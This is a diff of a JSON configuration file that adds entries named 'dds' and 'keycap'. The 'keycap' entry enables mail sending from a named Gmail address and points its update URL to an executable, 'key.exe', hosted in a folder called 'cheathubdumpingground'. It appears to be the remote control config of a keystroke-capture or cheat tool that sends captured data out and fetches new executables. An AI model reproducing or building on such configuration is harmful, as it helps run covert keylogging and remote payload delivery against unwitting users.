@@ -1,4 +1,20 @@
-{"urls":{
-
+{
+    "dds": {
+        "version": "00.00.00",
+        "maintenance": false,
+        "run": false,
+        "urls": {
+            
+        }
+    },
+    "keycap": {
+        "version": "00.00.00",
+        "maintenance": false,
+        "sendm": true,
+        "receiver": "",
+        "gmkey": "old",
+        "sender": "fmboyplanefacker69@gmail.com",
+        "downloadurl": "none",
+        "updateurl": "blockhunter0007.github.io/cheathubdumpingground/otherdownloads/key.exe"
     }
 }
